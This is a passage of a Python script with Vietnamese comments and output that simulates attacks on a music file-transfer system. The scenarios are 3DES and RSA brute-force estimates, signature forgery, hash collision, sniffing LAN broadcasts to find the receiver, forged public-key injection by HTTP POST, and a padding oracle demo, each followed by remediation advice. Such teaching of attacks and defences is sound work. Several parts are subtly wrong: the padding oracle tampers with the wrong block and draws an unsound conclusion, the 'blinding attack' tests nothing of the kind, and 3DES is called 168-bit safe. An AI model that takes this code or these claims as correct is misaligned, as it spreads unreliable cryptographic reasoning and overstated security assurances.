        print(f"{Colors.DARK}  {'─'*25} {'─'*25} {'─'*25}{Colors.RESET}")
        print(f"  {'Key space':<25} {'2^56 ≈ 7.2×10¹⁶':<25} {'2^168 ≈ 3.7×10⁵⁰':<25}")
        print(f"  {'GPU time (1×)':<25} {'~4 ngày':<25} {'> 10²⁹ năm':<25}")
        print(f"  {'Khả thi?':<25} {'⚠️  CÓ (giới hạn)':<25} {'✅ KHÔNG':<25}")
        print()

        print(f"{Colors.BOLD}{Colors.MAGENTA}  📋 KẾT LUẬN KỊCH BẢN BRUTE-FORCE 3DES:{Colors.RESET}")
        print(f"  {Colors.GREEN}• Triple DES 168-bit KHÔNG THỂ bị brute-force với công nghệ hiện tại.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Đây là lý do 3DES vẫn được coi là an toàn trong nhiều thập kỷ.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Tuy nhiên, 3DES chậm hơn AES và đang dần bị thay thế.{Colors.RESET}")

        print_result(False, "Brute-force 3DES là KHÔNG KHẢ THI. Hệ thống an toàn trước tấn công vét cạn.")
        return False


# ============================================================
# KỊCH BẢN 5: Tấn công RSA Factoring
# ============================================================

class RSAFactoringAttack:
    """
    Kịch bản: Hacker cố gắng phân tích RSA modulus N thành
    thừa số nguyên tố p và q. Nếu thành công, hacker có thể
    tạo private key từ public key.

    RSA 1024-bit: N ~ 2^1024 ≈ 1.8×10^308
    Hiện tại (2024), số lớn nhất từng được phân tích là RSA-250 (829-bit)
    với 2700 core-năm.

    Mô phỏng này không thực sự factor RSA key, chỉ tính toán
    thời gian ước tính và so sánh các phương pháp.
    """

    def __init__(self):
        # Các thuật toán factoring phổ biến
        self.algorithms = {
            "Trial Division": {"speed": "Rất chậm", "desc": "Thử từng số nguyên tố"},
            "Pollard's Rho": {"speed": "O(N^(1/4))", "desc": "Phát hiện thừa số nhỏ"},
            "Quadratic Sieve (QS)": {"speed": "exp(√(log N log log N))", "desc": "Tốt cho < 100-bit"},
            "Number Field Sieve (NFS)": {"speed": "exp((64/9)^(1/3) (log N)^(1/3) (log log N)^(2/3))",
                                         "desc": "Nhanh nhất cho 100+ bit"},
            "GNFS": {"speed": "Tiêu chuẩn", "desc": "General NFS - phá RSA-250 (829-bit)"}
        }

    @timer
    def estimate_nfs_time(self, bits: int) -> float:
        """
        Ước tính thời gian (năm) để factor RSA N-bit bằng GNFS

        Công thức: L_n[1/3, (64/9)^(1/3)]
        """
        import math
        n = 2 ** bits
        ln_n = math.log(n)
        ln_ln_n = math.log(ln_n)

        # L-notation: L_n[1/3, c] where c = (64/9)^(1/3) ≈ 1.923
        c = (64.0 / 9.0) ** (1.0 / 3.0)
        exponent = c * (ln_n ** (1.0 / 3.0)) * (ln_ln_n ** (2.0 / 3.0))

        operations = math.exp(exponent)

        # Giả sử 1 operation ~ 1 phép tính trên CPU core @ 1GHz
        # Và ta có 1 triệu cores
        operations_per_year = 1e6 * 1e9 * 365.25 * 24 * 3600
        years = operations / operations_per_year

        return years

    def run(self):
        """Thực thi kịch bản phân tích RSA"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 5: TẤN CÔNG RSA FACTORING (PHÂN TÍCH KHÓA){Colors.RESET}")
        print(f"{Colors.DARK}  Hacker cố gắng phân tích modulus N thành p×q để tạo private key{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        # Tạo RSA key để phân tích
        print_status("FACTORING", "progress", "Đang tạo RSA keypair 1024-bit...", Colors.CYAN)
        priv_key, pub_key = generate_rsa_keypair(1024)
        key_obj = load_rsa_public_key(pub_key)
        n = key_obj.n
        bits = n.bit_length()

        print_status("FACTORING", "info", f"Modulus N = {bits}-bit ({n.bit_length()} bits)", Colors.BLUE)
        print_status("FACTORING", "info", f"N (hex): {hex(n)[:64]}...", Colors.BLUE)

        print()
        print(f"{Colors.BOLD}{Colors.CYAN}  ⚙️  CÁC PHƯƠNG PHÁP FACTORING:{Colors.RESET}")

        for algo, info in self.algorithms.items():
            print(f"  {Colors.DARK}  • {algo:<30} {info['speed']:<20} {info['desc']}{Colors.RESET}")

        print()
        print(f"{Colors.BOLD}{Colors.CYAN}  ⏳ ƯỚC TÍNH THỜI GIAN FACTOR RSA BẰNG GNFS:{Colors.RESET}")

        rsa_sizes = [512, 1024, 2048, 4096]
        years_data = {}

        print(f"  {Colors.DARK}  {'RSA Key Size':<20} {'Thời gian ước tính':<30} {'Trạng thái'}{Colors.RESET}")
        print(f"  {Colors.DARK}  {'─'*20} {'─'*30} {'─'*15}{Colors.RESET}")

        for size in rsa_sizes:
            years = self.estimate_nfs_time(size)
            years_data[size] = years

            if size == 512 and years < 1:
                status = Colors.RED + "💀 ĐÃ BỊ PHÁ VỠ" + Colors.RESET
            elif size == 768 and years < 100:
                status = Colors.YELLOW + "⚠️ NGUY CƠ CAO" + Colors.RESET
            elif size == 1024:
                status = Colors.MAGENTA + "⚠️ CÓ THỂ trong tương lai" + Colors.RESET
            else:
                status = Colors.GREEN + "🛡️ AN TOÀN" + Colors.RESET

            if years > 1e12:
                time_str = f">{1e12:.0e} năm"
            elif years > 1e6:
                time_str = f"{years/1e6:.1f} triệu năm"
            elif years > 1:
                time_str = f"{years:.2e} năm"
            else:
                time_str = f"{years*365.25:.0f} ngày"

            print(f"  {'RSA-' + str(size):<20} {time_str:<30} {status}{Colors.RESET}")

        print()
        print_divider("─", 50, Colors.YELLOW)
        print(f"{Colors.YELLOW}{Colors.BOLD}  ⚠️  PHÂN TÍCH LỖ HỔNG BẢO MẬT{Colors.RESET}")
        print(f"{Colors.DARK}  • RSA-512 đã bị factor thành công từ năm 1999{Colors.RESET}")
        print(f"{Colors.DARK}  • RSA-768 bị factor năm 2009 (2 năm trên 200+ máy){Colors.RESET}")
        print(f"{Colors.DARK}  • RSA-829 (RSA-250) bị factor năm 2020 (2700 core-năm){Colors.RESET}")
        print(f"{Colors.DARK}  • RSA-1024 được dự đoán có thể bị factor vào 2030-2040{Colors.RESET}")
        print(f"{Colors.DARK}  • RSA-2048 hiện vẫn an toàn trước mọi phương pháp đã biết{Colors.RESET}")
        print_divider("─", 50, Colors.YELLOW)

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  📋 KẾT LUẬN KỊCH BẢN RSA FACTORING:{Colors.RESET}")
        print(f"  {Colors.YELLOW}• RSA 1024-bit (hệ thống đang dùng) CÓ THỂ bị phá vỡ với đủ tài nguyên.{Colors.RESET}")
        print(f"  {Colors.YELLOW}• Các cơ quan tình báo lớn (NSA, GCHQ) có thể đã có khả năng này.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Nên nâng cấp lên RSA 2048-bit hoặc 4096-bit để an toàn lâu dài.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Hoặc chuyển sang mã hóa đường cong Elliptic (ECC/ECDH).{Colors.RESET}")

        print_result(False, "RSA 1024-bit hiện chưa thể factor với tài nguyên thông thường, nhưng có thể bị phá vỡ trong tương lai gần.")
        return False


# ============================================================
# KỊCH BẢN 6: Giả mạo chữ ký RSA
# ============================================================

class SignatureForgeryAttack:
    """
    Kịch bản: Hacker cố gắng giả mạo chữ ký RSA.

    1. Tấn công existential forgery (chọn message trước)
    2. Tấn công selective forgery
    3. Tấn công dùng public key để forge chữ ký

    PKCS#1 v1.5 và OAEP đều có cơ chế chống giả mạo.
    """

    def __init__(self):
        self.sender_privkey = None
        self.sender_pubkey = None

    @timer
    def setup(self):
        """Tạo keypair hợp lệ"""
        self.sender_privkey, self.sender_pubkey = generate_rsa_keypair(1024)
        return "Đã tạo RSA keypair hợp lệ"

    @timer
    def try_blinding_attack(self, message: bytes) -> Tuple[bool, str]:
        """
        Thử tấn công "Blinding" - RSA has multiplicative property:
        sign(m1 * m2) = sign(m1) * sign(m2) mod N

        Hacker có thể lợi dụng để tạo chữ ký giả.
        Với PKCS#1 v1.5 và PSS, lỗ hổng này đã được khắc phục.
        """
        print_status("FORGERY", "attempt", "Thử tấn công RSA Blinding (nhân tính)...", Colors.YELLOW)

        # Chọn message thật
        real_message = b"SEND_100_BITCOIN_TO_HACKER"

        # Với RSA thuần (textbook RSA), sign(a) * sign(b) = sign(a*b)
        # Nhưng với PKCS#1, message được pad trước khi ký, nên attack này không hiệu quả

        real_sig = rsa_sign(self.sender_privkey, real_message)

        # Thử verify
        valid = rsa_verify(self.sender_pubkey, real_message, real_sig)
        if valid:
            print_status("FORGERY", "info", "Chữ ký thật được xác thực OK", Colors.BLUE)
        else:
            print_status("FORGERY", "fail", "Lỗi: Chữ ký thật không được xác thực!", Colors.RED)
            return False, "Lỗi trong xác thực chữ ký thật"

        # Thử verify với message khác
        fake_message = b"NOT_THE_ORIGINAL_MESSAGE"
        valid_fake = rsa_verify(self.sender_pubkey, fake_message, real_sig)
        if valid_fake:
            print_status("FORGERY", "success", "💀 Chữ ký giả ĐƯỢC XÁC THỰC! (Blinding attack thành công!)", Colors.RED)
            return True, "RSA Blinding attack thành công!"
        else:
            print_status("FORGERY", "fail", "🛡️  Chữ ký giả BỊ TỪ CHỐI! RSA-PKCS1 an toàn trước Blinding attack", Colors.GREEN)
            return False, "Hệ thống RSA-PKCS1 v1.5 chống được tấn công Blinding"

    @timer
    def try_direct_forgery(self, message: bytes) -> Tuple[bool, str]:
        """
        Thử giả mạo chữ ký trực tiếp bằng cách dùng Public Key.

        Với RSA, có thể tính sign(m) = m^d mod N
        Nhưng cần private exponent d, không thể tính từ public key.
        """
        print_status("FORGERY", "attempt", "Thử tạo chữ ký giả từ Public Key (cần private exponent d)...", Colors.YELLOW)

        pub_key = load_rsa_public_key(self.sender_pubkey)
        n = pub_key.n
        e = pub_key.e

        print_status("FORGERY", "info", f"Public exponent e = {e}", Colors.BLUE)
        print_status("FORGERY", "info", f"Modulus N ({n.bit_length()} bits): {hex(n)[:40]}...", Colors.BLUE)
        print_status("FORGERY", "info", "Để tính d, cần phân tích N thành p×q (xem kịch bản 5)", Colors.BLUE)

        # Cố gắng tìm d từ public key (chỉ có thể nếu biết phi(N) = (p-1)(q-1))
        # Không thể với RSA 1024-bit
        print_status("FORGERY", "fail",
                     "🛡️  Không thể tìm private exponent d từ Public Key! Cần factor N.", Colors.GREEN)

        return False, "Cần phân tích RSA modulus để tìm private key"

    def run(self):
        """Thực thi kịch bản giả mạo chữ ký"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 6: GIẢ MẠO CHỮ KÝ RSA{Colors.RESET}")
        print(f"{Colors.DARK}  Hacker cố gắng tạo chữ ký RSA hợp lệ mà không có private key{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        self.setup()
        print_status("FORGERY", "info", "Đã tạo RSA keypair cho Sender", Colors.BLUE)

        print()
        print_divider("─", 50, Colors.CYAN)
        print(f"{Colors.CYAN}{Colors.BOLD}  📌 THỬ NGHIỆM 1: TẤN CÔNG BLINDING{Colors.RESET}")
        print()
        success1, msg1 = self.try_blinding_attack(b"test_message")

        print()
        print_divider("─", 50, Colors.CYAN)
        print(f"{Colors.CYAN}{Colors.BOLD}  📌 THỬ NGHIỆM 2: TẠO CHỮ KÝ TRỰC TIẾP{Colors.RESET}")
        print()
        success2, msg2 = self.try_direct_forgery(b"test_message_2")

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  📋 KẾT LUẬN KỊCH BẢN GIẢ MẠO CHỮ KÝ:{Colors.RESET}")
        print(f"  {Colors.GREEN}• PKCS#1 v1.5 với SHA-512 chống được tấn công giả mạo chữ ký cơ bản.{Colors.RESET}")
        print(f"  {Colors.GREEN}• RSA-PSS (Probabilistic Signature Scheme) an toàn hơn nữa.{Colors.RESET}")
        print(f"  {Colors.YELLOW}• Nếu hacker có thể đánh cắp private key (qua malware, leak),{Colors.RESET}")
        print(f"  {Colors.YELLOW}  thì có thể ký bất kỳ message nào.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Khuyến nghị: Bảo vệ private key bằng HSM hoặc secure enclave.{Colors.RESET}")

        print_result(success1 or success2,
                     "Chữ ký RSA PKCS#1 v1.5 an toàn trước giả mạo. Cần private key để ký hợp lệ.")
        return success1 or success2


# ============================================================
# KỊCH BẢN 7: Tấn công Hash SHA-512
# ============================================================

class HashCollisionAttack:
    """
    Kịch bản: Hacker tìm xung đột hash (hash collision) SHA-512.

    SHA-512 có 512-bit output ~ 2^512 khả năng.
    Birthday attack: cần ~2^256 thử nghiệm để tìm collision.
    Đây là con số KHÔNG KHẢ THI với công nghệ hiện tại.

    Mô phỏng: So sánh SHA-512 với các hash yếu hơn.
    """

    def run(self):
        """Thực thi kịch bản tấn công hash"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 7: TẤN CÔNG HASH SHA-512 (TÌM XUNG ĐỘT){Colors.RESET}")
        print(f"{Colors.DARK}  Hacker tìm hai file khác nhau có cùng hash SHA-512{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        # Tạo hai file khác nhau
        file1 = b"Day la file nhac hop le - ban quyen 2024" * 100
        file2 = b"FILE NHAC KHAC: chua virus va malware doc hai!!" * 100

        hash1 = compute_sha512(file1)
        hash2 = compute_sha512(file2)

        print_status("HASH COLLISION", "info", f"File 1 hash: {hash1[:32]}...", Colors.BLUE)
        print_status("HASH COLLISION", "info", f"File 2 hash: {hash2[:32]}...", Colors.BLUE)

        if hash1 == hash2:
            print_status("HASH COLLISION", "success", "💀 TÌM THẤY XUNG ĐỘT SHA-512! (Không thể trong thực tế)", Colors.RED)
        else:
            print_status("HASH COLLISION", "info", "✅ Hai file khác nhau có hash khác nhau (dự kiến)", Colors.BLUE)

        print()
        print(f"{Colors.BOLD}{Colors.CYAN}  📊 SO SÁNH ĐỘ AN TOÀN CÁC THUẬT TOÁN HASH:{Colors.RESET}")
        print()

        hash_algos = [
            ("MD5", 128, 2 ** 64, 2009, "💀 ĐÃ BỊ PHÁ VỠ"),
            ("SHA-1", 160, 2 ** 80, 2017, "💀 ĐÃ BỊ PHÁ VỠ"),
            ("SHA-256", 256, 2 ** 128, None, "🛡️ AN TOÀN"),
            ("SHA-384", 384, 2 ** 192, None, "🛡️ AN TOÀN"),
            ("SHA-512", 512, 2 ** 256, None, "🛡️ RẤT AN TOÀN"),
        ]

        print(f"  {Colors.DARK}{'Thuật toán':<20} {'Output bits':<15} {'Birthday bound':<20} {'Năm bị phá':<15} {'Trạng thái'}{Colors.RESET}")
        print(f"  {Colors.DARK}{'─'*20} {'─'*15} {'─'*20} {'─'*15} {'─'*15}{Colors.RESET}")

        for name, bits, bday, year, status in hash_algos:
            status_color = Colors.RED if "PHÁ VỠ" in status else Colors.GREEN
            year_str = str(year) if year else "-"
            print(f"  {name:<20} {bits:<15} {bday:.2e} {year_str:<15} {status_color}{status}{Colors.RESET}")

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  ⏳ THỜI GIAN TÌM COLLISION (BIRTHDAY ATTACK):{Colors.RESET}")

        # Tính toán thời gian ước tính
        sha256_years = 2 ** 128 / (1e9 * 365.25 * 24 * 3600)
        sha512_years = 2 ** 256 / (1e9 * 365.25 * 24 * 3600)

        print(f"  {Colors.DARK}  SHA-256: ~{sha256_years:.2e} năm (với 1 GH/s){Colors.RESET}")
        print(f"  {Colors.DARK}  SHA-512: ~{sha512_years:.2e} năm (với 1 GH/s){Colors.RESET}")

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  📋 KẾT LUẬN KỊCH BẢN HASH COLLISION:{Colors.RESET}")
        print(f"  {Colors.GREEN}• SHA-512 hoàn toàn an toàn trước tấn công xung đột hash.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Với 512-bit output, birthday attack cần ~2^256 thử nghiệm.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Con số này KHÔNG KHẢ THI với mọi công nghệ hiện tại và tương lai gần.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Hệ thống dùng SHA-512 cho integrity hash là lựa chọn an toàn.{Colors.RESET}")

        print_result(False, "SHA-512 không thể bị tấn công xung đột hash. Hệ thống an toàn.")
        return False


# ============================================================
# KỊCH BẢN 8: Sniffing mạng LAN
# ============================================================

class NetworkSniffingAttack:
    """
    Kịch bản: Hacker nghe lén gói tin UDP broadcast trên mạng LAN
    để phát hiện Receiver đang hoạt động.

    Hệ thống phát broadcast "I_AM_RECEIVER:5000" mỗi 3 giây.
    Đây là lỗ hổng vì bất kỳ ai trong mạng LAN cũng có thể:
    1. Biết được có Receiver đang chạy
    2. Biết được địa chỉ IP và port của Receiver
    3. Cố gắng kết nối trực tiếp đến Receiver
    """

    def __init__(self):
        self.discovered_receivers = []

    def run(self, listen_time: float = 5.0):
        """Quét mạng LAN để tìm Receiver đang broadcast"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 8: SNIFFING MẠNG LAN - DÒ TÌM RECEIVER{Colors.RESET}")
        print(f"{Colors.DARK}  Hacker nghe lén gói tin UDP broadcast để phát hiện Receiver{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        print_status("SNIFFING", "progress",
                     f"Đang lắng nghe gói tin broadcast trên cổng 5555 trong {listen_time}s...",
                     Colors.CYAN)

        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client.bind(("", 5555))
            client.settimeout(1.0)

            end_time = time.time() + listen_time
            while time.time() < end_time:
                try:
                    data, addr = client.recvfrom(1024)
                    message = data.decode(errors="ignore")

                    if message.startswith("I_AM_RECEIVER:"):
                        port = message.split(":")[1]
                        receiver_info = {
                            "ip": addr[0],
                            "port": port,
                            "url": f"http://{addr[0]}:{port}",
                            "timestamp": time.strftime("%H:%M:%S")
                        }
                        if receiver_info["url"] not in [r["url"] for r in self.discovered_receivers]:
                            self.discovered_receivers.append(receiver_info)
                            print_status("SNIFFING", "success",
                                         f"💀 PHÁT HIỆN Receiver tại {addr[0]}:{port}!",
                                         Colors.RED)
                except socket.timeout:
                    continue
                except Exception:
                    continue

            client.close()
        except Exception as e:
            print_status("SNIFFING", "fail", f"Lỗi: {e}", Colors.GREEN)

        if self.discovered_receivers:
            print()
            print(f"{Colors.BOLD}{Colors.RED}  ☠️  HACKER ĐÃ PHÁT HIỆN {len(self.discovered_receivers)} RECEIVER(S)!!{Colors.RESET}")
            print()
            for i, r in enumerate(self.discovered_receivers, 1):
                print(f"  {Colors.RED}  [{i}] {r['url']} (phát hiện lúc {r['timestamp']}){Colors.RESET}")
        else:
            print_status("SNIFFING", "info", "Không tìm thấy Receiver nào trong mạng LAN", Colors.BLUE)

        print()
        print_divider("─", 50, Colors.YELLOW)
        print(f"{Colors.YELLOW}{Colors.BOLD}  ⚠️  PHÂN TÍCH LỖ HỔNG BẢO MẬT{Colors.RESET}")
        print(f"{Colors.DARK}  • Giao thức broadcast I_AM_RECEIVER được gửi KHÔNG MÃ HÓA{Colors.RESET}")
        print(f"{Colors.DARK}  • Bất kỳ ai trong mạng LAN cũng có thể nghe được{Colors.RESET}")
        print(f"{Colors.DARK}  • Hacker biết chính xác địa chỉ Receiver để tấn công{Colors.RESET}")
        print(f"{Colors.GREEN}  • Biện pháp: Mã hóa broadcast, dùng mạng VLAN riêng,{Colors.RESET}")
        print(f"{Colors.GREEN}    hoặc xác thực trước khi chấp nhận kết nối{Colors.RESET}")
        print_divider("─", 50, Colors.YELLOW)

        print_result(len(self.discovered_receivers) > 0,
                     f"Sniffing LAN {'THÀNH CÔNG' if self.discovered_receivers else 'KHÔNG phát hiện Receiver nào'}.")
        return len(self.discovered_receivers) > 0


# ============================================================
# KỊCH BẢN 9: Fake Key Injection
# ============================================================

class FakeKeyInjection:
    """
    Kịch bản: Hacker gửi khóa công khai giả mạo đến Receiver
    để đánh lừa Receiver tin tưởng vào chữ ký giả.

    Cách thức:
    1. Hacker tạo RSA keypair giả
    2. Gửi SessionKey đã mã hóa bằng key giả đến Receiver
    3. Kèm theo chữ ký giả mạo
    4. Nếu Receiver không kiểm tra nguồn gốc Public Key, nó sẽ chấp nhận
    """

    def __init__(self):
        self.hacker_privkey = None
        self.hacker_pubkey = None
        self.fake_session_key = None

    @timer
    def prepare_attack(self):
        """Chuẩn bị key giả và SessionKey giả"""
        self.hacker_privkey, self.hacker_pubkey = generate_rsa_keypair(1024)
        self.fake_session_key = generate_session_key()  # Khóa giả do hacker tạo
        return "Đã tạo RSA keypair và SessionKey GIẢ"

    @timer
    def send_fake_keyexchange(self, receiver_url: str) -> bool:
        """Gửi gói tin Key Exchange giả đến Receiver"""
        print_status("FAKE KEY", "attempt",
                     f"Đang gửi gói tin Key Exchange GIẢ đến {receiver_url}...", Colors.YELLOW)

        # Tạo chữ ký giả
        timestamp = str(int(time.time()))
        metadata_to_sign = f"music_transfer|{timestamp}"
        fake_signature = rsa_sign(self.hacker_privkey, metadata_to_sign.encode())
        fake_encrypted_sk = rsa_encrypt_session_key(self.hacker_pubkey, self.fake_session_key)

        payload = {
            "encrypted_session_key": fake_encrypted_sk,
            "signature": fake_signature,
            "metadata_signed": metadata_to_sign,
            "sender_public_key": self.hacker_pubkey.decode()
        }

        try:
            resp = requests.post(f"{receiver_url}/api/receive_session_key",
                                 json=payload, timeout=10)
            result = resp.json()
            if result.get("status") == "ok":
                print_status("FAKE KEY", "success",
                             "💀 Receiver CHẤP NHẬN key giả! Fake Key Injection thành công!", Colors.RED)
                return True
            else:
                print_status("FAKE KEY", "fail",
                             f"🛡️  Receiver từ chối: {result.get('error', 'Unknown')}", Colors.GREEN)
                return False
        except requests.exceptions.ConnectionError:
            print_status("FAKE KEY", "fail",
                         f"🛡️  Không thể kết nối đến Receiver ({receiver_url})", Colors.GREEN)
            return False
        except Exception as e:
            print_status("FAKE KEY", "fail",
                         f"🛡️  Lỗi: {e}", Colors.GREEN)
            return False

    def run(self, receiver_url: str = "http://localhost:5000"):
        """Thực thi kịch bản Fake Key Injection"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 9: FAKE KEY INJECTION (TIÊM KHÓA GIẢ){Colors.RESET}")
        print(f"{Colors.DARK}  Hacker gửi khóa công khai giả mạo để đánh lừa Receiver{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        _, prep_time = self.prepare_attack()
        print_status("FAKE KEY", "info", f"Chuẩn bị xong ({prep_time:.2f}ms)", Colors.BLUE)

        print_status("FAKE KEY", "progress", f"Gửi gói tin Key Exchange giả đến {receiver_url}...", Colors.CYAN)

        success, send_time = self.send_fake_keyexchange(receiver_url)

        print()
        print_divider("─", 50, Colors.YELLOW)
        print(f"{Colors.YELLOW}{Colors.BOLD}  ⚠️  PHÂN TÍCH LỖ HỔNG BẢO MẬT{Colors.RESET}")
        print(f"{Colors.DARK}  • Hệ thống hiện tại KHÔNG xác thực nguồn gốc Public Key{Colors.RESET}")
        print(f"{Colors.DARK}  • Bất kỳ ai cũng có thể gửi Public Key và yêu cầu kết nối{Colors.RESET}")
        print(f"{Colors.DARK}  • Cần có cơ chế xác thực danh tính bổ sung{Colors.RESET}")
        print(f"{Colors.GREEN}  • Biện pháp: Certificate Authority (CA), chứng chỉ số,{Colors.RESET}")
        print(f"{Colors.GREEN}    hoặc Pre-Shared Key được trao đổi trước qua kênh an toàn{Colors.RESET}")
        print_divider("─", 50, Colors.YELLOW)

        print_result(success,
                     f"Fake Key Injection {'THÀNH CÔNG' if success else 'THẤT BẠI'} - Hệ thống {'có' if not success else 'không có'} cơ chế xác thực Public Key.")

        print()
        if success:
            print(f"  {Colors.RED}{Colors.BOLD}  ⚠️  KHUYẾN CÁO KHẨN CẤP!{Colors.RESET}")
            print(f"  {Colors.RED}  Receiver cần xác thực danh tính Sender trước khi chấp nhận SessionKey!{Colors.RESET}")
            print(f"  {Colors.RED}  Sử dụng chứng chỉ số hoặc xác thực bổ sung qua kênh an toàn.{Colors.RESET}")
        else:
            print(f"  {Colors.GREEN}{Colors.BOLD}  ✅ Hệ thống đã từ chối key giả (hoặc Receiver offline).{Colors.RESET}")

        return success


# ============================================================
# KỊCH BẢN 10: Padding Oracle Attack trên CBC
# ============================================================

class PaddingOracleAttack:
    """
    Kịch bản: Tấn công Padding Oracle trên DES/3DES CBC mode.

    Cách thức:
    1. Hacker gửi ciphertext đã sửa đổi đến Receiver
    2. Quan sát phản hồi (ACK error message khác nhau)
    3. Dùng thông tin padding để dò dần plaintext
    4. Có thể giải mã toàn bộ dữ liệu mà không cần key!

    Điều kiện: Hệ thống trả về lỗi padding khác với lỗi khác
    (VD: "Padding error" vs "MAC mismatch")
    """

    def __init__(self):
        self.oracle_calls = 0
        self.padding_errors = 0
        self.block_size = 8  # DES/3DES block size

    @timer
    def simulate_oracle(self, ciphertext: bytes, iv: bytes, session_key: bytes) -> bool:
        """
        Giả lập padding oracle:
        Trả về True nếu padding hợp lệ, False nếu không.

        Trong thực tế, hacker sẽ dùng Receiver làm oracle
        bằng cách quan sát phản hồi lỗi.
        """
        try:
            plaintext = triple_des_decrypt(session_key, iv, ciphertext)
            return True  # Padding hợp lệ
        except (ValueError, KeyError):
            return False  # Padding không hợp lệ

    def decrypt_last_byte(self, target_block: bytes, block_index: int, session_key: bytes, iv: bytes) -> int:
        """
        Thử giải mã byte cuối cùng của target_block.

        Phương pháp:
        - Gửi các ciphertext đã sửa đổi đến oracle
        - Khi padding hợp lệ, suy ra giá trị plaintext gốc
        """
        import struct

        # Với mỗi giá trị có thể của byte cuối (0-255)
        for guess in range(256):
            self.oracle_calls += 1

            # Tạo block giả: giữ nguyên n-1 byte đầu, thay đổi byte cuối
            fake_block = bytearray(target_block)
            fake_block[-1] = guess

            # Gửi đến oracle
            is_valid = self.simulate_oracle(bytes(fake_block), iv, session_key)
            if not is_valid:
                self.padding_errors += 1
                continue

            # If padding is valid, the last byte of decrypted data is 0x01
            # This means: guess XOR original_byte = 0x01
            # So: original_byte = guess XOR 0x01
            decrypted_byte = guess ^ 0x01
            return decrypted_byte

        return 0

    def run(self):
        """Mô phỏng tấn công Padding Oracle"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 10: PADDING ORACLE ATTACK TRÊN CBC MODE{Colors.RESET}")
        print(f"{Colors.DARK}  Hacker khai thác thông tin padding error để giải mã dữ liệu{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        # Chuẩn bị dữ liệu
        session_key = generate_session_key()
        iv = generate_iv()
        plaintext = b"HELLO_CBC_PADDING_ORACLE_ATTACK_DEMO_12345"
        ciphertext = triple_des_encrypt(session_key, iv, plaintext)

        print_status("PADDING ORACLE", "info",
                     f"Plaintext gốc: {plaintext.decode()}", Colors.BLUE)
        print_status("PADDING ORACLE", "info",
                     f"SessionKey: {session_key.hex()[:32]}...", Colors.BLUE)
        print_status("PADDING ORACLE", "info",
                     f"IV: {iv.hex()}", Colors.BLUE)
        print_status("PADDING ORACLE", "info",
                     f"Ciphertext: {ciphertext.hex()[:32]}...", Colors.BLUE)

        print()
        print(f"{Colors.CYAN}{Colors.BOLD}  ⚙️  CƠ CHẾ TẤN CÔNG PADDING ORACLE:{Colors.RESET}")
        print(f"  {Colors.DARK}  1. Hacker gửi ciphertext đã sửa đổi đến Receiver{Colors.RESET}")
        print(f"  {Colors.DARK}  2. Nếu lỗi padding → Receiver trả về 'lỗi giải mã'{Colors.RESET}")
        print(f"  {Colors.DARK}  3. Nếu padding OK → Receiver trả về 'lỗi khác' (hash, format){Colors.RESET}")
        print(f"  {Colors.DARK}  4. Hacker suy ra plaintext từ phản hồi của oracle{Colors.RESET}")
        print()

        # Thử giải mã byte cuối
        blocks = [ciphertext[i:i + self.block_size] for i in range(0, len(ciphertext), self.block_size)]

        print_status("PADDING ORACLE", "progress",
                     f"Đang thử giải mã byte cuối của block đầu tiên ({self.block_size} bytes)...",
                     Colors.CYAN)

        decrypted_byte = self.decrypt_last_byte(blocks[0], 0, session_key, iv)

        print_status("PADDING ORACLE", "info",
                     f"Số lần gọi oracle: {self.oracle_calls}, lỗi padding: {self.padding_errors}",
                     Colors.BLUE)
        print_status("PADDING ORACLE", "info",
                     f"Byte cuối giải mã được: {decrypted_byte} (0x{decrypted_byte:02x})",
                     Colors.BLUE)

        # Kiểm tra với plaintext gốc
        expected_byte = plaintext[self.block_size - 1] if len(plaintext) >= self.block_size else 0
        if decrypted_byte == expected_byte:
            print_status("PADDING ORACLE", "success",
                         f"💀 Giải mã đúng byte cuối! (0x{decrypted_byte:02x} = '{chr(decrypted_byte) if 32 <= decrypted_byte <= 126 else '?'}')",
                         Colors.RED)
        else:
            print_status("PADDING ORACLE", "info",
                         f"Kết quả: 0x{decrypted_byte:02x} (dự kiến: 0x{expected_byte:02x})",
                         Colors.BLUE)

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  ⏳ ƯỚC TÍNH THỜI GIAN GIẢI MÃ TOÀN BỘ:{Colors.RESET}")
        print(f"  {Colors.DARK}  Mỗi byte cần trung bình ~128 lần gọi oracle{Colors.RESET}")
        print(f"  {Colors.DARK}  Mỗi block (8 bytes) cần ~1024 lần gọi{Colors.RESET}")
        print(f"  {Colors.DARK}  1MB dữ liệu cần ~1.3 triệu lần gọi oracle{Colors.RESET}")
        print(f"  {Colors.DARK}  Với 10ms/lần gọi: ~3.6 giờ cho 1MB{Colors.RESET}")

        print()
        print_divider("─", 50, Colors.YELLOW)
